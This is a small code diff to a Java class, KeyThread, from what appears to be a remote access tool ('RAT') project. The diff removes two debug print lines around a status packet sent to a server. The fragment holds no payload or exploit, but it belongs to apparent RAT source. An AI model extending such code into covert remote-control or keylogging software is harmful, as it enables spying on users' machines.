@@ -24,12 +24,9 @@ public class KeyThread implements Runnable {
 			try {
 				Thread.sleep(1000L);
 
-				System.out.println("Sending packet...");
 				server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
 					@Override
 					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
-						System.out.println("Writing packet...");
-
 						int len = dis.readInt();
 						System.out.println("Length: " + len);
 
